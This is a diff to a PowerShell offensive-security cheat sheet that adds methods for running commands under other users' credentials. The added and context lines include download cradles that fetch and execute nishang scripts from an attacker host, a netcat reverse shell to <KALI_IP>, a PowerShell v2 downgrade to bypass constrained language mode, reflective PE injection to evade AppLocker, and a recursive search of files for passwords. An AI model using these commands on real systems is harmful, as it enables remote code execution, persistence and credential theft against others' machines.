@@ -1,6 +1,23 @@
-## Extract zip file
+## Execute Powershell as a different user
+### Method #1: Start-Job --> Has Fork Effect
 ```powershell
-Expand-Archive <FILE>.zip
+$cred = New-Object System.Management.Automation.PSCredential ("<USERNAME>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))
+Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<KALI_IP>/nishang.ps1')}
+```
+### Method #2: Start-Process --> Has Fork Effect
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential ("<USERNAME>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))
+Start-Process -Credential $Cred PowerShell.exe -ArgumentList IEX(New-Object Net.webClient).downloadString('http://<KALI_IP>/nishang.ps1')
+```
+### Method #3: Invoke-Command --> Has Fork Effect
+```
+$cred = New-Object System.Management.Automation.PSCredential ("<USERNAME>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))
+Invoke-Command 127.0.0.1 -Credential $Cred -Scriptblock {c:\programdata\nc64.exe -e powershell.exe <KALI_IP> <PORT>} -AsJob
+```
+
+## Downgrade to powershell v2 (bypass constrained language mode)
+```powershell
+Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"
 ```
 
 ## Execute powershell in memory
@@ -24,7 +41,9 @@ $env:processor_architecture
 ```
 
 ## Locally listening ports (TCP)
-`netstat -ano -p tcp`
+```
+netstat -ano -p tcp
+```
 
 ## Get ACL
 ```powershell
@@ -53,7 +72,9 @@ c:\windows\microsoft.net\framework64
 ```
 
 ## get-bytes of a string
-`[System.Text.Encoding]::UTF8.GetBytes('hello')`
+```powershell
+[System.Text.Encoding]::UTF8.GetBytes('hello')
+```
 
 ## Reflective Execution (Can Bypass Applocker)
 ```powershell
@@ -63,16 +84,6 @@ Invoke-reflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes('<PATH_TO_EXE>'))
 ## CMD to powershell
 ```shell
 powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"
-```
-
-## Start a job with alternative creds
-```powershell
-Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')}
-```
-
-## Downgrade to powershell v2 (bypass constrained language mode)
-```powershell
-Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"
 ```
 
 ## Find files Alternate Data Streams
@@ -99,4 +110,6 @@ Enable-PSRemoting -Force
 ```
 
 ## Search for strings in files (needs optimization)
-`$ErrorActionPreference = 'SilentlyContinue';ls -Recurse -Force | % {sls -Path $_.fullname -Pattern ".*password.*"}; $ErrorActionPreference = 'continue'`
+```
+$ErrorActionPreference = 'SilentlyContinue';ls -Recurse -Force | % {sls -Path $_.fullname -Pattern ".*password.*"}; $ErrorActionPreference = 'continue'
+```
